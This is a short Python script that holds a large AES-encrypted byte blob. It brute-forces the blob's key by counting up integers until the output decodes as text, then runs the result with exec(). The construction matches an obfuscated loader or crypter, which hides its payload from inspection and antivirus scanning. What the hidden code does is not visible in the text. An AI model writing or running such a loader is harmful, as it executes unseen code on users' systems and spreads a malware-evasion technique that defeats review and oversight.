from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'T\x8c\t\xf1\xee\xfb(\x13\x9fo\xa5c-\xf8\x15\xd5\x8f^\x82lNOA/e\xdb\r\xddg?\xde\x8c\x07\x81\x9c\x1e\xff\x87\x08:\xff\x9a\x9b\xfbG\x19]\x87tV\xd8vvb\x96\x8c\x16\xf9\x1am\xa6H\xd8\xa8C\x02\xe4y\x1e<\x9d\xf5\xa7a4\x99\xceUd<\xd5\xb42\x02j\xfa\x90\xbc\x9bQ2\x83V\x83\xde\x14\xea\xdf\x17\x15\xaai$\xa46\xf5\xb8;\x1d\xc3`DPZ%\xc4c\x11[\xfe7\xec;1\x9f\x81\x8f\xfa\xeb\xdcO>\xa1E\xf4E@\xf2\xa8;1\xfb\x19\x93a\xb18\xcen\x1d\xa3\x16\xf9\x1c\t\x80J\xc5n\x8e\x1d\xea\xe1\xef\x03\xec\xc9\xf9\x8c\xb7\xfaGY\xd8\x80\xcd\xc9EC\xc4*p\x91\x1b|\xfcD\xdda\'\x1f`l\xe0\x90\x7f\xd4\xabq\x0c\xa6\xa2\x17L\x00\xa9&\x99\xe1\n\xe8\xe9\xaa%#\xbe\x1a\xca\xfc\xb5\xdf\xb0\xac\xd8\x15\xabD\xc8\x1e\x8dg\x19\xcaT\xda\xc0}L\x12\x0e\xe5\xa9~\x99w\xbeT\xbf\xab\xcf\xc2\xb3\x15\x07\xa1\xe2\x88\xd4\xe5\xb2\xc6\x93\xd9h\xb1\x95\\b\xf4\'\x93G*\x95\x1b\xf9\xa8\x88g\x86\xfbPJ\xbc9\xd7\t\x12\xf4\xd7\xe0\xad\xa0KqA\x10\xb6O\x19\x89Jk\x14,\xd0M\x8e\xd1{\xaf\xe4\xb1B\xf7\xc7\r\xfdf\x9d\x87\xc7./i\xff5\xa3\x0e\xbe\x9d\x8f\xba\xc6\x0ew\x86\ro\xadpfh\xb5\xc7\x0f\x03\x9c\xfdk\xc0}\xc0\xbbY\xbd\xdb\xad\xbc\x90i\xff\xa9=\xb2\x91\x1c\x9a\xb5\x90\xd3\x19\xfaQm+\xc6\x019f\xc4\xeb\xf7\x95\xc7\xf6\x1dzf\x9b\x8eQ\xbbl\xc5&\x1ae\xc5-T\x110\xc8\x13;\x90W\xe5m.\x7f\x1e\x1c\x14fS\xb5\x00\x19&l8%C\x86w\x01\x02\xa3qE\xcd\xd1\x80\xdd\x14\xfa\\\xeb\xae_V\x94p\xf92@8\xb1\xf3\xca\xb67\xbf\xe3x\x15\x9c\xa1)\x05\x98\xe4\x91f\x1f|\xbb\xf1\x15h\xa6\xab\xda\x17!\xaej\x9d\xdb\xee\xfb\xed\x89\x89T#\xfa\xc13\xf5Y\xf2\xb9p\xfe\xf6\xec\xdd\xe3Oc\xf2+~q\xe0\x01\xae\xb2\x94h.]\xf8\xdfw\x97\xb0\xde\x8e\x9bg\xbfVz\x8d\x0f)[ \xc7[\xc4F\n\xb3O P0\xcfP8Mf\x88\xcd\x000\xd8\xf9T\xf4\x17\xfcDSI\\7\xea\x14F\xeb\x1a\x18P\x18\xf68\xa2ci\x8f9\xf0\xba\xd7\xbb\xbf<\x0b\x85\xe3~JB)=\xc1\xa99V\xdc\x83\xd9\xcc n$\xa9\xe1\xcc\xd36\xb0\\\x13\x85\xc9\x01\xbc\x86\x84R\x9eyZ\xea\\\xb3\x03\x1f`\x92\x14VA;6)\x0eM~\'\x9b\xa4\x04n:\xb0\x08\xd9\x85\xedi}\x9a\'\xa9\x0c1\xbfq\xc3e\xb1\xa8\x1c\x1a\xc4\xb5\x0c\x8d\x18kw\x01|\x1cuj\xa1}0\x07\xc1\xa6\x0e\x85\xcb\x1e\x8c\xfd\xc5\xde\xe5w5\x02W\x95\xfc\x89\xc3k\xbc\xb4\x1e\xe3\xd3\xea\x96\xc6\xa6C\x1c%\xdd\xfd\x1b\xdc\x03\x0e\x13\x9d\x90\x0fTk\x8b\xe2t~]\xa0d\x16\x9d\xe6NX\xe3\x8c\xefl\xa3\xab\x99\x9b\xf8\xda5\xef\xd1\xdchJ(H6\xfc\xa34\x0e\x12\xa7\xba\x9f1\xfeu\xa8\x98~W\xec\xeb\x08\x06\xb9\xea=\x002\xd6\xcd"\xb3\xc0\xa0\x94\x88\xff\x1d \xdfm\x9f\x16W_\xed\xd7\xed\x04x\x14\xee\xc8\x91\xcdi\xfe\x8a=\xcf\x1f8\x00\x03\x12\x1eX\xe6\x94\x9c\x01\x1e\xb3\x98(\x8e\xa5:\xce\xd1\x85,Nf\xebb\xaa\xa5/\xc9\xa3K\x08\x97;\xf8\x1c9D\xd5a\x94\xde\x06\xc1\xbc\xb4\x193M\xdb*\xdc\x8dg\x10h\xba\xa7\x0b\xcd5\x03\xb9\x19X]*\xafp\xebJ\x91\xa2Sz\xae\x13\x1c\xef\xc3\xd3\x1eoB\x9dw\x19\xbf\xdf\xcf\xc7<\x14E\x0f\xd0\xbb\xfb`\xf4\x1c\'\xdc\x9c~\x07!\xbf\x04\xf8B\xc6%\xe9Try\xcd\xa3\xaa\xf7\x97\xf5\x03A\xf7\xa3\x19\xad\x9c\x8bi\xab\xe9\xffo\xc0h"\xe89\r\xa0\xe9\x18\x18fO\xd5\x02 N\xeb\xdd\xeff/\xf5\xeb3V\x0b\xd8\xd2\x8a{Y\\\xfb\xc6\xd5\xc3\xd0<\n;h[6\x98\xce\x8c\xf6Dp\x81\x91\x06U\x97n\x91vR\xbc\xfb\xe6\xdf\xed\x86\x87$>\xd0\xee\xbc\xc8\x96\x1c>\xc6\xf2\x98\x8a\x19\xb3\x0e\xb8M`dV\x0f\xfa\xec\xba\xc8\x00\xb1\x94\xb2\x15]\xdc\x05l2XK\xb0\xd8A\t\x8f\t\x11\x84t(\x8b_\x9a:#\xae\x8b\x86\xd9\rQ\x9c\xe1}\xe3\xd4\x15\x92\xc9\xf8\xd6\xcb;\x88\xf0\x81\xd4\xc7\x88f\xf0\xbb\xa9\xa9\x1cV\x17W\x83\t/\xca|z\x99a\x0f\xd6Q:\x0b\xbe\xae\x9d\xc5f1\x0b\x12\xc2\xa6Z*\xc9\x94\x90z\x00F\xdd\x87s\x9aN,\xef\xfc\x85\xc6\xa0\xe9\n\xbfz\xed)\xf8W\xabd\x06\x8d\x04\xe2\x03"\xa5\x19\xb6\xa1\xeb\xa3C\xfb^{\xf1\x11\xb0\xef\xf54&\x8a=r\xad\x10\xb7\x99\xe2\x05\xb1?RT\x8d\xb1<\x07\xbe\xee\x15\xe88\xc3\xe53o\xa0\xb3\x9a\xdcHM|\xd7\xd9\x9cj\xbb\xa1&Q\x93\xd2\xe9\xa8\xee\xd6\xd2\x95\xa02l\xaad\xca\x0eI\xf2H*\xc9\x8f\x1d\xb0\xe6/\xc4ZX\no\xaf\xf8\x89\x15\xfey\xbd\x8c\xd0$>\r\x83\xf6\t\xcb!\x93\xc5v\xc8\xff\xdd\x1b\xea[\xa3\x1cF\xb2\x11\'\xc0\xc8\x87\xdd\xef\xaa\xee\xdd\xc7k\xc9\xb4\x1d7\x1aN\x9b\x9d2\x1dd?\xe5\xd3`E\x0b\x1e\x9d\xe6\xb2\xdf\x06v\xce6\x12\xda\xbd\x059\xad\xfcV\x9c\xdf\xb4|\xd7w<tLh\xa0\x86\xd5\xc5\xbd\xe2\'\xfd!{)\xd63\x18i\xada\x1c\xd9E4\x85LCA\xcb\xf7L\xd8\xb4\xf4\x83\xa6D\x10N%\x9a\x92\xd18p\xc1\x03\x12N\xaeX5\xda\x94\xc5\xee\x00\xb9h\xab\r\xbdV\xfc\xd1\x8a)\xcf\x1f\xcf\x95&\xf8\x1aJ\xa2\xfc\xd1F\xed\xad\x15\x1e\xd5aR\xcaXs\x8c\xce\xc7\x16^\xcb\xf4-i\x8f\x03\x0e\xd7\tiQ\x0cP \xa9\xe8-G\x84\\3\x9a\xf7p\t:@\x9e^\x05_!\x96#R\x89\x1c\xb8<\xf9]\xa8\xa3\x81B\x17 M.\xbd\x9e\x89\xb8!\xa9\x92F\x1f\xd72ky\xad$_i\x93\xfc~O\x84\xae\x99\x7f(^\x85\xe3i!*%|\x1f\x94|\x03d\x00p2\xe1\xc4\x8b\xa13\xea\xd3\xb1\xf5}\xde\x84\x9f\x96>\x0f)\x05\xd5Vx\xbf\x9e\xd4G\x06kA{\x1a\xfb-Hd$\xa6\x8dg\x8e\x0b\x99\xbeK\xcbV\xa2\x021\xb2\x1f\xe24p\x01\xc5,\xdadQW\xad\x11.\x05\x06\xbe\x15\x14\ra\x1e\xeb\r\xde\x1b\xb6)\xe1/ \x8fs\x9e\xf6AY/ft\xa1M\r3z\x1d\xaf@\xd37\x90"^PD\xb9\x17A\x1dfa\xfa\xb59\xefuf\x9d\x98!\xe7B\x06$r\xd8\xcd\x05\x03Su\xa3\x82 @\xa5Au\x1d\xa5O\xa1\xd5\xe42\xcd%\xa9\r \xf7\xb8,\xf1\x9cQh\xba\xde\xb9\x90\x8c\xd7H_D\x93\xa6\x8c\xfbPS\xe5&\x8e\xfa\x8ew\xe0oK\x1b\xb4F\xf8\x95\x03I\x16.\t\x81A\x11\xb6G\xe2c\x0c\xf2\x9fq+\xd4Mg\xd5F\xba\xe5F$\xddg\xe6\xc5G\x05u\x8cs\xef\xdbA\xc6\x84K\x98<\x96\x8e\x08\r\xd1\xbe\xd9\xa8g_\xc9Xt\xbec\x19\x97\xb5U\xc0\x1fu$H\xcddg\xf8\x8c\xab\xe6\xc6\xee\xccr\xa0\x9c\xcaZp.i\x94\xbe\xf8\'\xca\xa7\xf3\xd5\x03\xffP\x92(\xcb\xde,k\xac\x81\x1f\xd5\x02\xa1\xfe\x93Z\xffv\xdd\x02\xfa\xa6\t_\x999\x01\xfdD`\x06\xbfA\xec\xd8\xb5\xf5m\xa5\xd2\x96?\xbb%\x1a\x89\xa9\x12.\xb0\x12q-\x91H\xd9Q\xb0\x01s])\x99]\x9c\xf4\x10\x14\xa4\xe7\xfe\x06sD\x80j7\x8f\xcf\xa6_\xa5J0\xdd1\x8e|\x95\x04\xafK\xcf(\x18\xd4L0\xec\x942v\xda\xd2\\\xdd\xb2\xc0\x11\xd5c\xa6\xb0|\xf5\xcd\x17j\xca\xf5\x04a_\xf1\xdf\xde\x07W\x03'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
